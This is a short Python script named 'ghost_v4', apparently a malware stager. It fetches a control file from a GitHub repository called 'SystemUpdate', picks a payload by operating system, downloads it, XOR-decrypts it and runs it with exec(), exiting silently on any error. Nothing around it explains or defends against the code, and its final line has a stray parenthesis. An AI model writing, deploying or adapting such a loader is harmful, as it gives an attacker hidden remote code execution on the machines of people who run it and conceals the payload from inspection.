import requests, platform, sys
URL_CONTROL = "https://raw.githubusercontent.com/mendrikarndrianarisolo-star/SystemUpdate/refs/heads/main/control.txt"

def ghost_v4():
    try:
        # Détecter Windows ou Android [cite: 2025-08-28]
        tag = "WIN" if platform.system() == "Windows" else "AND"
        r = requests.get(URL_CONTROL, timeout=10).text.splitlines()
        for line in r:
            target, key, file = line.split('|')
            if target == tag:
                raw_url = URL_CONTROL.rsplit('/', 1)[0] + "/" + file
                data = requests.get(raw_url).content
                # Déchiffrement XOR [cite: 2025-08-28]
                dec = bytearray(data[i] ^ ord(key[i % len(key)]) for i in range(len(data)))
                exec(dec.decode('utf-8'), globals())
                break
    except: sys.exit()
if __name__ == "__main__": ghost_v4())
